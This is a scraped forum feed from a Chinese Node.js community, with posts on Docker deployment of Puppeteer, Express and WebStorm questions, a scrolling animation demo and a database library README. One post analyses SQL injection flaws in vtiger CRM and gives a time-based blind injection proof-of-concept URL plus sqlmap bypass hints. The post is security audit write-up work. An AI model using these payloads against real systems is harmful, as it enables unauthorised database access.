class=\"prettyprint language-js\"><code>const browser = await puppeteer.launch({\n  args: [&#x27;--no-sandbox&#x27;, &#x27;--disable-dev-shm-usage&#x27;]\n});\n</code></pre><h2>四、通过 <code>Docker容器</code> 部署项目</h2>\n<blockquote>\n<p>项目干到最后，发现每次都需要安装Chromium，可能每次都会出现不可预料的问题出现。为了节约时间成本干更多有意义的事情，通过 <code>shell脚本</code> 和 <code>Docker容器化</code> 优化上述的部署流程。</p>\n</blockquote>\n<p><strong>Docker开发流程</strong></p>\n<ol>\n<li>确定基础镜像</li>\n<li>基于基础镜像编写<code>Dockerfile</code></li>\n<li>根据<code>Dockerfile</code>构建项目镜像</li>\n<li>将构建的镜像推送到<code>Docker仓库</code>，如果私有化部署直接将镜像导出，再去客户环境导入即可</li>\n<li>在测试/生产机器上拉取项目镜像创建并运行<code>Docker容器</code></li>\n<li>验证项目是否正常运行</li>\n</ol>\n<h3>这里以部署一个基于<code>Puppeteer</code>的服务为例</h3>\n<h3>确定基础镜像</h3>\n<pre class=\"prettyprint language-shell\"><code>\b# 在Docker Hub或私有仓库上搜索\b需要的镜像\ndocker search node\n</code></pre><p>前往<a href=\"https://hub.docker.com/\">Docker Hub</a>能看到更详细的\b描述和版本</p>\n<pre class=\"prettyprint language-shell\"><code># 在这选择 &#96;node:10-alpine&#96; 为基础镜像\ndocker pull node:10-alpine\n</code></pre><h3>编写<code>Dockerfile</code> （攻略不全，建议网上找更详细的资料）</h3>\n<p><strong><code>FROM</code></strong>: 指定基础镜像，必须是<code>Dockerfile</code>中的第一个非注释指令</p>\n<pre class=\"prettyprint language-dockerfile\"><code>FROM &lt;image name&gt;\nFROM node:10-alpine\n</code></pre><p><strong><code>MAINTAINER</code></strong>: 设置该镜像的作者</p>\n<pre class=\"prettyprint language-dockerfile\"><code>MAINTAINER &lt;author name&gt; (不推荐使用，推荐使用LABEL来指定镜像作者)\nLABEL MAINTAINER=&quot;zhangqiling&quot; (推荐)\n</code></pre><p><strong><code>RUN</code></strong>: 在shell或者exec的环境下执行的命令。RUN指令会在新创建的镜像上添加新的层面，接下来提交的结果用在Dockerfile的下一条指令中</p>\n<pre class=\"prettyprint language-dockerfile\"><code>RUN &lt;command&gt;\n\n# RUN可以执行任何命令，然后在当前镜像上创建一个新层并提交\nRUN echo &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;edge&#x2F;main&quot; &gt; &#x2F;etc&#x2F;apk&#x2F;repositories\n\n# 执行多条命令时，可以通过 \\ 换行\nRUN apk -U add \\\n  zlib-dev \\\n  xorg-server\n</code></pre><p><code>RUN</code>指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定<code>--no-cache</code>参数，如：<code>docker build --no-cache</code>。</p>\n<p><strong><code>CMD</code></strong>: 提供了容器默认的执行命令。 <code>Dockerfile</code>只允许使用一次<code>CMD</code>指令，如果\b存在多个<code>CMD</code>，也只有最后一个会生效</p>\n<pre class=\"prettyprint language-dockerfile\"><code># 有三种形式\nCMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]\nCMD [&quot;param1&quot;,&quot;param2&quot;]\nCMD command param1 param2\n</code></pre><p><strong><code>COPY</code></strong>: 于复制构建环境中的文件或目录到镜像中</p>\n<pre class=\"prettyprint language-dockerfile\"><code>COPY &lt;src&gt;... &lt;dest&gt;\nCOPY [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;]\n\n# 将项目复制到my_app目录下\nCOPY . &#x2F;workspase&#x2F;my_app\n</code></pre><p><strong><code>ADD</code></strong>: 也是复制构建环境中的文件或目录到镜像</p>\n<pre class=\"prettyprint language-dockerfile\"><code>ADD &lt;src&gt;... &lt;dest&gt;\nADD [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;]\n</code></pre><p>相比<code>COPY</code>, <code>ADD</code>的\b\b<code>&lt;src&gt;</code>可以\b是一个<code>URL</code>。\b同时如果是压缩文件，<code>Docker</code>会自动解压。</p>\n<p><strong><code>WORKDIR</code></strong>: 指定<code>RUN</code>、<code>CMD</code>与<code>ENTRYPOINT</code>命令的工作目录</p>\n<pre class=\"prettyprint language-dockerfile\"><code>WORKDIR &#x2F;workspase&#x2F;my_app\n</code></pre><p><strong><code>ENV</code></strong>: 设置环境变量</p>\n<pre class=\"prettyprint language-dockerfile\"><code># 两种方式\nENV &lt;key&gt; &lt;value&gt;\nENV &lt;key&gt;=&lt;value&gt;\n</code></pre><p><strong><code>VOLUME</code></strong>: 授权访问从容器内到主机上的目录</p>\n<pre class=\"prettyprint language-dockerfile\"><code>VOLUME [&quot;&#x2F;data&quot;]\n</code></pre><p><strong><code>EXPOSE</code></strong>: 指定容器在运行时监听的端口</p>\n<pre class=\"prettyprint language-dockerfile\"><code>EXPOSE &lt;port&gt;;\n</code></pre><h3>附上测试通过的<code>Dockerfile</code>样例</h3>\n<h4>几个注意点</h4>\n<ul>\n<li>使用国内阿里云镜像站加快安装依赖</li>\n<li>默认不支持中文显示，必须使用文泉驿的免费中文字体，这个库只有在 <code>https://mirrors.aliyun.com/alpine/edge/testing/</code>能找到</li>\n<li>容器内默认市区不是东八区，会影响日志打印，需要重新设置时区</li>\n<li>Centos机器上的docker容器内 <code>npm install</code> 会报错，设置 <code>npm config set unsafe-perm true</code>后能顺利安装，这是什么原因？（MacOS上的docker没这个问题）</li>\n</ul>\n<pre class=\"prettyprint language-Dockerfile\"><code># 拉取node镜像\nFROM node:10-alpine\n\n# 设置镜像作者\nLABEL MAINTAINER=&quot;qiyang.hqy@dtwave-inc.com&quot;\n\n# 设置国内阿里云镜像站、安装chromium 68、文泉驿免费中文字体等依赖库\nRUN echo &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;v3.8&#x2F;main&#x2F;&quot; &gt; &#x2F;etc&#x2F;apk&#x2F;repositories \\\n    &amp;&amp; echo &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;v3.8&#x2F;community&#x2F;&quot; &gt;&gt; &#x2F;etc&#x2F;apk&#x2F;repositories \\\n    &amp;&amp; echo &quot;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;alpine&#x2F;edge&#x2F;testing&#x2F;&quot; &gt;&gt; &#x2F;etc&#x2F;apk&#x2F;repositories \\\n    &amp;&amp; apk -U --no-cache update &amp;&amp; apk -U --no-cache --allow-untrusted add \\\n      zlib-dev \\\n      xorg-server \\\n      dbus \\\n      ttf-freefont \\\n      chromium \\\n      wqy-zenhei@edge \\\n      bash \\\n      bash-doc \\\n      bash-completion -f\n\n# 设置时区\nRUN rm -rf &#x2F;etc&#x2F;localtime &amp;&amp; ln -s &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime\n\n# 设置环境变量\nENV NODE_ENV production\n\n# 创建项目代码的目录\nRUN mkdir -p &#x2F;workspace\n\n# 指定RUN、CMD与ENTRYPOINT命令的工作目录\nWORKDIR &#x2F;workspace\n\n# 复制宿主机当前路径下所有文件到docker的工作目录\nCOPY . &#x2F;workspace\n\n# 清除npm缓存文件\nRUN npm cache clean --force &amp;&amp; npm cache verify\n# 如果设置为true，则当运行package scripts时禁止UID&#x2F;GID互相切换\n# RUN npm config set unsafe-perm true\n\n# 安装pm2\nRUN npm i pm2 -g\n\n# 安装依赖\nRUN npm install\n\n# 暴露端口\nEXPOSE 3000\n\n# 运行命令\nENTRYPOINT pm2-runtime start docker_pm2.json\n</code></pre><h3>参考文档，感谢分享</h3>\n<ul>\n<li><a href=\"https://github.com/chenxiaochun/blog/issues/38\">模拟浏览器操作行为的利器</a></li>\n<li><a href=\"http://imweb.io/topic/560b9827c2317a8c3e086225\">滚动，你真的懂了吗</a></li>\n<li><a href=\"https://zhaoqize.github.io/puppeteer-api-zh_CN\">Puppeteer中文文档</a></li>\n<li><a href=\"https://www.linuxidc.com/Linux/2015-02/112915.htm\">Linux沙箱技术介绍</a></li>\n<li><a href=\"https://deepzz.com/post/dockerfile-best-practices.html\">如何写好Dockerfile，Dockerfile最佳实践</a></li>\n</ul>\n</div>","title":"截图的诱惑：Docker部署Puppeteer项目","last_reply_at":"2018-12-23T11:37:45.699Z","good":false,"top":false,"reply_count":11,"visit_count":1819,"create_at":"2018-10-09T11:54:32.273Z","author":{"loginname":"huqiyang","avatar_url":"https://avatars1.githubusercontent.com/u/18712284?v=4&s=120"}},{"id":"5c1d901776c4964062a1c6e8","author_id":"59588675545d7a7b5b0b389e","tab":"ask","content":"<div class=\"markdown-text\"><p>感觉 Puppeteer 打开的是一个和无痕浏览器工作原理差不多的浏览器，并不能把本地 chrome 的 cookies带上去，请问可以把本地的cookie 自动带上去吗？</p>\n<pre class=\"prettyprint language-js\"><code>\n  puppeteer.defaultArgs({\n    userDataDir: &#x27;~&#x2F;Library&#x2F;Application\\ Support&#x2F;Google&#x2F;Chrome&#x27;\n  })\n  const browser = await puppeteer.launch({devtools: true,headless: false, executablePath: &#x27;&#x2F;Applications&#x2F;Google Chrome.app&#x2F;Contents&#x2F;MacOS&#x2F;Google Chrome&#x27;, slowMo: 100})\n  const page = await browser.newPage()\n  await page.goto(&#x27;https:&#x2F;&#x2F;www.baidu.com&#x27;)\n  \n</code></pre><p>使用了userDataDir也不行</p>\n</div>","title":"Puppeteer 怎么使用浏览器的cookie？","last_reply_at":"2018-12-22T08:12:10.421Z","good":false,"top":false,"reply_count":4,"visit_count":945,"create_at":"2018-12-22T01:15:03.653Z","author":{"loginname":"NanShanJi","avatar_url":"https://avatars3.githubusercontent.com/u/29830173?v=4&s=120"}},{"id":"5c1dd1933898674067a77122","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>具体情况：就是当用户浏览到某个页面时，这时用户点击登录操作，跳转到登录界面，登录成功之后，怎么回到刚刚浏览的那个页面呀？res.redirect(‘back’)好像不行。</p>\n</div>","title":"关于express中res.redirect('back')的小小的问题","last_reply_at":"2018-12-22T07:28:55.120Z","good":false,"top":false,"reply_count":6,"visit_count":530,"create_at":"2018-12-22T05:54:27.222Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5c1c65843898674067a76bb3","author_id":"5bfd65d4be1b120abac5d838","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FraqA_qWM4XnQpPzjuUzQIV-n_pe\" alt=\"999999999.png\"></p>\n</div>","title":"用WebStorm开发时，提示Unused parameter xxx. 如何巧妙的解决？","last_reply_at":"2018-12-21T10:23:32.687Z","good":false,"top":false,"reply_count":3,"visit_count":660,"create_at":"2018-12-21T04:01:08.150Z","author":{"loginname":"Aaron009","avatar_url":"https://avatars1.githubusercontent.com/u/3838050?v=4&s=120"}},{"id":"5c1cbaa676c4964062a1c591","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>最近的一个活动页面需要做一个可以左右滑动的抽签效果，故通过用css的transform属性和js结合来模拟可以无限滚动的效果。</p>\n<p>先上效果：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/444847/fhhz5e0xeu.gif\" alt=\"img\"></p>\n<p>demo地址：<a href=\"https://kiroroyoyo.github.io/cardTransform/index.html\">https://kiroroyoyo.github.io/cardTransform/index.html</a></p>\n<h1>实现过程</h1>\n<h3>1. 结构与样式</h3>\n<p>结构：卡片分前后两排，每列插入10个div结点，以便做左右位移效果。</p>\n<p>样式：设置每一列都恰好好在中间位置（或中间位置附近），如下所示。</p>\n<p>a. 前排（cardFrond）相对于视口的初始位置(left:-255.5%;)：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/444847/rfh4n9e7q4.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>b. 后排（backFrond）相对于视口的初始位置(left:-228.3%;)：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/444847/h99ufl6g67.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<h3>2. 无限滚动原理</h3>\n<p>由于这里的停止位置是固定的，前排永远是当前卡片相对于视口居中，后排永远是两个卡片相对于视口居中，且每个卡片是一样的，所以当卡片列表向前或向右移动到一个目标位置时，都将列表重置为初始位置继续滚动。如下图以前排卡片为例：</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/444847/2li745oiuh.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>所以当滚动停止后会统一将列表样式设置为transform: translateX(0)。而对于用户这一操作是无感知的，认为已经滑动到了新的位置。</p>\n<h3>3.滑动过程实现</h3>\n<p>a. 目标位移与帧位移</p>\n<p>为了做出滑动后到停留位置的缓动效果，所以当用户左右滑动屏幕时，会记录滑动距离，计算出卡片该到的目标位移位置，目标位移位置是有规则的，因为这里有10张卡片均分宽度，位置必须是(100%/10)的整数倍，例如-40%、-30%、……40%，这样才能保证目标位置与初始位置相重合。</p>\n<p>目标位移代码片段</p>\n<pre class=\"prettyprint language-js\"><code>onDocumentMouseUp : function(e){\n    &#x2F;&#x2F;如果是点击事件 不设置移动\n    if (!this.fingerTouch)\n      return;\n    this.moveDirect = this.lon &gt; 0 ? 1 : -1;\n    this.transNum = this.lon&#x2F;10 + this.moveDirect;\n    this.lon = Math.round(this.transNum) * 10;\n    this.fingerTouch = false;   \n}\n</code></pre><p>记录了目标位移后，每一帧会以一定的帧位移不断靠近目标位移，使其在手指离开屏幕时仍有慢慢滑动到目标位置的缓动效果。此时需要判断当前位置是否大于40%或者小于-40%，若超过这个极限值需要重设目标位移及帧位移，使其在极限值内。</p>\n<pre class=\"prettyprint language-js\"><code>animate: function(){\n    this.prePos += (this.lon - this.prePos) * 0.1;\n    if (this.prePos &gt; 40) {\n      this.lon = this.lon - 40;\n      this.prePos = this.prePos - 40;\n    }else if (this.prePos &lt; -40) {\n      this.lon = this.lon + 40;\n      this.prePos = this.prePos + 40;\n    }\n    &#x2F;&#x2F;判断是否到达了目标位置\n    if (Math.abs(this.prePos - this.lon) &lt; 0.01 &amp;&amp; Math.abs(this.lon) &gt; 0.01 &amp;&amp; (!this.fingerTouch))\n    {\n        this.ani_move = false;\n        this.prePos = 0;\n        this.frondCard.style = &quot;transform: translateX(&quot;+ this.prePos +&quot;%)&quot;;\n        this.backCard.style = &quot;transform: translateX(&quot;+ this.prePos +&quot;%)&quot;;\n    }else{\n        this.frondCard.style = &quot;transform: translateX(&quot;+ this.prePos +&quot;%)&quot;;\n        this.backCard.style = &quot;transform: translateX(&quot;+ (-this.prePos) +&quot;%)&quot;;\n        requestAnimationFrame(this.animate.bind(this));\n    }\n  },\n</code></pre><p>b. 连续滑动判断</p>\n<p>当在上次滑动动画还未播放结束时用户又进行了第二次滑动时，需要执行一下操作：</p>\n<p>​    1). 判断滑动时机处于上次滑动手指已离开屏幕但动画还未结束，此时需要记录两个flag，一个是ani_move，记录动画是否仍在进行，fingerTouch记录手指是否停留屏幕。</p>\n<p>​    2). 判断第二次滑动是否与第一次不同方向，若不同向需重置上次帧位移为0。以免上次帧位移太大影响移动方向。</p>\n<p>1)与2)代码片段：</p>\n<pre class=\"prettyprint language-js\"><code>if( this.ani_move &amp;&amp; this.fingerTouch == false) {\n    &#x2F;&#x2F; 判断是否不同向\n    if (((e.clientX - prex) &gt; 0 ? 1: -1) == -this.moveDirect ) {\n        this.lon = 0;\n        this.prePos = 0;\n        this.moveDirect = -this.moveDirect;\n    }\n}\n</code></pre><p>3). 取消第二次滑动时的动画播放和位移重置</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 若是上次动画未结束不需要再次启动动画和重置目标位移\nif( this.ani_move &amp;&amp; this.fingerTouch == false) {\n}\nelse {\n    this.lon = 0;\n     cardAnimate.animate();\n}\n</code></pre><h1>写在最后</h1>\n<p>目前这个滑动效果只能针对卡片相同，停留位置固定的情况，因为需要做到位置重合。使用css transform来做无限滚动的效果，可以避免改变dom结点带来的页面重新布局。</p>\n<p>下图是chrome cpu6倍减速调试效果，没有触发layout，FPS基本维持在60左右。</p>\n<p><img src=\"https://ask.qcloudimg.com/draft/444847/crto6xhx3t.png?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>代码地址：</p>\n<p><a href=\"https://github.com/kiroroyoyo/cardTransform\">https://github.com/kiroroyoyo/cardTransform</a></p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"如何做活动页面的滚动动画？让用户体验MAX的demo在这里！","last_reply_at":"2018-12-21T10:04:22.354Z","good":false,"top":false,"reply_count":0,"visit_count":491,"create_at":"2018-12-21T10:04:22.354Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c1cb9a83898674067a76ea4","author_id":"5c10c50f7ec239239ff561c2","tab":"share","content":"<div class=\"markdown-text\"><p>昨天在限免的时候下了这个可以把 iphone 变成 mac 的第二个键盘的 “Mac的远程键盘”（by Evgeny Cherpak）\n觉得挺好玩的，尤其需要输入很多数字的时候，这个就挺方便。不过这个键盘最棒的一点就是可以自定义很多快捷键组合，比如截图，比如mac的停止某个程序（我每次都记不住这个命令）\n不过我突然想到一点，之前跟朋友一起在 mac 上玩合金弹头，13 寸的 mac 根本放不下四只手… 所以也许可以把 iphone 变成 player 2 的手柄？今晚准备回去试试。\n刚看了一下，好像现在还是限免中，感兴趣的可以看看这个介绍：\n<a href=\"https://mergeek.com?project_id=BGeY0RWNLbnbMKaE&amp;ref=cnode\">Mergeek: Mac的远程键盘</a></p>\n<p><img src=\"//static.cnodejs.org/FpZDoJfEIATEO4B5rQF9zeMwQKoN\" alt=\"image.png\"></p>\n</div>","title":"分享个可以把 iphone 变成 mac 键盘的 app","last_reply_at":"2018-12-21T10:00:08.945Z","good":false,"top":false,"reply_count":0,"visit_count":571,"create_at":"2018-12-21T10:00:08.945Z","author":{"loginname":"Kilen","avatar_url":"https://avatars1.githubusercontent.com/u/2741628?v=4&s=120"}},{"id":"5c1c5a6376c4964062a1c216","author_id":"5954a4dedc2f37a7459e6018","tab":"ask","content":"<div class=\"markdown-text\"><p>请问如何用cluster将不同http请求分发给不同进程处理，谢谢</p>\n</div>","title":"请问如何用cluster将不同http请求分发给不同进程处理","last_reply_at":"2018-12-21T09:08:02.130Z","good":false,"top":false,"reply_count":9,"visit_count":629,"create_at":"2018-12-21T03:13:39.375Z","author":{"loginname":"halloweb","avatar_url":"https://avatars2.githubusercontent.com/u/20942044?v=4&s=120"}},{"id":"5c1c5edd76c4964062a1c252","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<h2>0x00 前言</h2>\n<p>干白盒审计有小半年了，大部分是业务上的代码，逻辑的复杂度和功能模块结构都比较简单，干久了收获也就一般，有机会接触一个成熟的产品（vtiger CRM）进行白盒审计，从审计的技术难度上来说，都比公司内的那些业务复杂得多，而真正要提高自己技术水平，更应该看的也是这些代码。</p>\n<p>vtiger CRM是一个客户关系管理系统。</p>\n<h2>0x01 分析整体结构</h2>\n<p><code>https://www.vtiger.com/open-source-crm/download-open-source/</code>代码下载下来，本地搭建。使用phpstorm进行审计。</p>\n<ol>\n<li>主目录下的vtigerversion.php可以查看当前版本。</li>\n</ol>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/r6wti40kqr.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<ol>\n<li>\n<p>整体代码目录</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/d3u6a1gbh4.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n</li>\n</ol>\n<p>其中主要得功能实现就在modules目录当中，也是我们重点审计的地方。libraries目录是使用到的第三方的一些东西，includes目录是路由加载，封装系统函数的地方。</p>\n<p>整个系统代码量确实很多，真要审计完估计没有十天半个月是不行的，看了一个礼拜，只发现几个问题。</p>\n<h2>0x02 modules/Calender/actions/feed.php SQL注入分析</h2>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/6atvirf2ki.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>一个成熟的产品，审计的难点就在于各种类，对象的封装和继承，A调用B，B调用C，C调用D…</p>\n<p>Vtiger_BasicAjax_Action 这个对象，是modules下vtiger目录里的，而vtiger这个也是核心的module.</p>\n<p>回到feed.php,直接定位有漏洞的代码，103行后。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/bnirgzziu0.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>我图中标的，也正是注入点的位置。</p>\n<p>$fieldName参数由逗号分割成数组，如果分成后的数组值为2则进入逻辑，然后参数进入SQL语句形成注入。虽然整个系统采用了PDO的查询方式，但是如果有SQL语句存在直接拼接的话，还是有注入的风险。</p>\n<p>这里payload不能使用逗号，可以采用 (select user())a join的方法绕过。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/b0l78bhd1n.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>往下走的话，SQL注入漏洞更是多不胜数。也没有再看的必要了。</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/zgrictzneb.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<h2>0x03 /modules/Documents/models/ListView.php SQL注入</h2>\n<p>直接看漏洞代码</p>\n<p><img src=\"https://ask.qcloudimg.com/http-save/2359520/ws9hb4diom.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<p>可以看到sortorder参数又是直接拼接。此处是order by后的注入，只能用基于时间的盲注。</p>\n<p>直接上SQLmap吧，但是sqlmap的payload会使用&gt;，尖括号因为xss防御，已经被过滤所以需要使用绕过脚本。 <code>--tamper greatest</code> 绕过。</p>\n<p>poc:</p>\n<pre class=\"prettyprint language-js\"><code>index.php?module=Documents&amp;parent=&amp;page=1&amp;view=List&amp;viewname=22&amp;orderby=filename&amp;sortorder=and&#x2F;**&#x2F;sleep(5)&amp;app=MARKETING&amp;search_params=[]&amp;tag_params=[]&amp;nolistcache=0&amp;list_headers=[%22notes_title%22,%22filename%22,%22modifiedtime%22,%22assigned_user_id%22,%22filelocationtype%22,%22filestatus%22]&amp;tag=\n</code></pre><p><img src=\"https://ask.qcloudimg.com/http-save/2359520/n5590drsqi.jpeg?imageView2/2/w/1620\" alt=\"img\"></p>\n<h2>0x04 写在最后</h2>\n<p>由于时间原因，只看了前几个模块，还有好多地方没有看。</p>\n<p>漏洞都很简单，真正花费时间的是走通逻辑，验证漏洞，不停地跳转查看函数调用，和各种类对象的继承。这也是白盒审计的头疼之处，要忍着性子看开发跳来跳去，没准哪个地方就跳错了。有点难受，还没找到getshell的地方。</p>\n<p><strong>此文已由作者授权腾讯云+社区发布</strong></p>\n<hr>\n</div>","title":"Vtiger CRM 几处SQL注入漏洞分析，测试工程师可借鉴","last_reply_at":"2018-12-21T03:32:45.877Z","good":false,"top":false,"reply_count":0,"visit_count":540,"create_at":"2018-12-21T03:32:45.877Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c19b97e76c4964062a1b295","author_id":"5bfd65d4be1b120abac5d838","tab":"ask","content":"<div class=\"markdown-text\"><p>附上图\n<img src=\"//static.cnodejs.org/FglJS8jxA37jpDQWq22XsWJG4fm-\" alt=\"11111111.jpg\">\n<img src=\"//static.cnodejs.org/Fr9pct7cTDiWukxSKKyd2RUxW7B9\" alt=\"2222.jpg\"></p>\n<p>看着波浪线实在难受。</p>\n</div>","title":"用Webstorm开发NodeJS，调用内置API时 提示 Instance member is not accessible，求解决方法。","last_reply_at":"2018-12-21T03:09:12.225Z","good":false,"top":false,"reply_count":2,"visit_count":780,"create_at":"2018-12-19T03:22:38.996Z","author":{"loginname":"Aaron009","avatar_url":"https://avatars1.githubusercontent.com/u/3838050?v=4&s=120"}},{"id":"5c1b893476c4964062a1bf9c","author_id":"5c1b86a23898674067a76911","tab":"ask","content":"<div class=\"markdown-text\"><p>目标:\n如何才能让单元测试时,app.actor也存在?(app.actor是由插件处理上去的).</p>\n<p>已知情况:\n1.项目正常执行, 断点处, 检查变量 this.app.actor 存在(插件egg-cqrs处理的)\n2.单元测试 断点处,检查变量app.actor 不存在.其中 单元测试的app 信息如下(来自mock)\nconst mock = require(‘egg-mock’);\ndescribe(‘test/app/actor/social.test.js’, async () =&gt; {\nlet app;\nbefore(() =&gt; {\napp = mock.app({\nbaseDir: ‘apps/meng’,\n});\nreturn app.ready();\n});</p>\n</div>","title":"egg单元测试中如何使插件的一些功能生效?","last_reply_at":"2018-12-21T01:34:34.151Z","good":false,"top":false,"reply_count":2,"visit_count":477,"create_at":"2018-12-20T12:21:08.602Z","author":{"loginname":"huang12zheng","avatar_url":"https://avatars2.githubusercontent.com/u/28038074?v=4&s=120"}},{"id":"5c0f5a377ec239239ff55aab","author_id":"57452aae754d17df1e44d9d7","tab":"share","content":"<div class=\"markdown-text\"><p>**github 地址： <a href=\"https://github.com/yujintang/superdb\">superdb</a>， 欢迎大家前来使用与提供建议 **</p>\n<h1>superdb</h1>\n<p><strong>使用场景：</strong></p>\n<ol>\n<li>拒绝拼接SQL语句，长期维护且达到易读效果</li>\n<li>减少ORM模型定义，表更新频繁</li>\n<li>支持链式操作，让数据定义更灵活</li>\n<li>多数据库支持</li>\n<li>频繁读数据放入缓存</li>\n<li>性能提升</li>\n</ol>\n<h2>TODO</h2>\n<ul>\n<li>[ ] postgresqls</li>\n</ul>\n<p><strong>Table of contents</strong></p>\n<ul>\n<li><a href=\"#installation\">Installation</a></li>\n<li><a href=\"#quickStart\">QuickStart</a></li>\n<li><a href=\"#connection\">Connection</a></li>\n<li><a href=\"#conn-methods\">Conn methods</a></li>\n<li><a href=\"#findoptions\">findOptions</a></li>\n<li><a href=\"#chain-methods\">Chain methods</a></li>\n<li><a href=\"#op\">Op</a></li>\n</ul>\n<h3>Installation</h3>\n<pre class=\"prettyprint language-shell\"><code>yarn add https:&#x2F;&#x2F;github.com&#x2F;yujintang&#x2F;superdb.git\n</code></pre><p>or</p>\n<pre class=\"prettyprint language-shell\"><code>yarn add superdb\n</code></pre><p>or</p>\n<pre class=\"prettyprint language-shell\"><code>npm install --save superdb\n</code></pre><h3>QuickStart</h3>\n<pre class=\"prettyprint language-js\"><code>const Superdb = require(&#x27;superdb&#x27;);\nconst db = new Superdb(&#x27;mysql:&#x2F;&#x2F;root:password@localhost&#x2F;example&#x27;, { logging: true });\n\nconst main = async () =&gt; {\n  const conn = await db.createConn();\n  const result = await conn.find(&#x27;tb_example&#x27;, {\n    select: [&#x27;id&#x27;, &#x27;name&#x27;],\n    where: {\n      id: 1,\n      name: conn.Op.is(null),\n    },\n    limit: 5,\n  });\n  console.log(result);\n};\nmain();\n\n&#x2F;&#x2F; SELECT id, name FROM tb_example WHERE id = 1 AND name IS null LIMIT 5\n</code></pre><h3>Connection</h3>\n<pre class=\"prettyprint language-js\"><code>const db = new Superdb(config, options);\nconst conn = await db.createConn();\n</code></pre><h4>config</h4>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 1\nconfig = {\n  connectionLimit : 10,\n  host              : &#x27;localhost&#x27;,\n  port              : &#x27;3306&#x27;,\n  user              : &#x27;root&#x27;,\n  password          : &#x27;password&#x27;,\n  database          : &#x27;example&#x27;\n}\n\n&#x2F;&#x2F; 2\nconfig = &#x27;mysql:&#x2F;&#x2F;user:password@host:post&#x2F;database&#x27;\n</code></pre><h4>options</h4>\n<pre class=\"prettyprint language-js\"><code>options = {\n    dialect   : &#x27;mysql&#x27;,  &#x2F;&#x2F; which db? default: &quot;mysql&quot;,\n    pool      : true,     &#x2F;&#x2F; connection pool ? default true\n    promise   : true      &#x2F;&#x2F; using promise async&#x2F;await ? default true\n    logging   : false,    &#x2F;&#x2F; print sql ? default false\n    maxLimit  : -1,       &#x2F;&#x2F; sql limit, default no limit\n    redis     : {\n      config    : undefined,    &#x2F;&#x2F; can use {host: &quot;&quot;, port: &quot;&quot;, password: &quot;&quot;, db: &quot;&quot;} or &quot;redis:&#x2F;&#x2F;:password@host:port&#x2F;db&quot;,\n      cache     : &#x27;false&#x27;       &#x2F;&#x2F; use cache ? default false\n      ttl       : 60 * 60       &#x2F;&#x2F; if use cache, how long expire? default 60 * 60,  ttl can set at every query();\n    }\n}\n</code></pre><h3>Conn methods</h3>\n<h4>query</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.query(sql)\n\nconst result = await conn.query(&#x27;select * from tb_example&#x27;)\n&#x2F;&#x2F; select * from tb_example\n</code></pre><h4>find</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.find(tbName, findOptions);\n\nconst result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      id: 333,\n      name: &#x27;superdb&#x27;,\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE id = 333 AND name = &#x27;superdb&#x27;\n</code></pre><h4>findOne</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.findOne(tbName, findOptions);\n\nconst result = await conn.find(&#x27;tb_example&#x27;, {\n    where: {\n      id: 333,\n      name: &#x27;superdb&#x27;,\n    },\n  });\n&#x2F;&#x2F; SELECT * FROM tb_example WHERE id = 333 AND name = &#x27;superdb&#x27; LIMIT 1\n</code></pre><h4>findAndCountAll</h4>\n<pre class=\"prettyprint language-js\"><code>await conn.findAndCountAll(tbName, findOptions);\n\n  const result = await conn.findAndCountAll(&#x27;tb_example&#x27;, {\n    where: {\n      id: 333,\n      name: &#x27;superdb&#x27;,\n    },\n  });\n&#x2F;&#x2F; 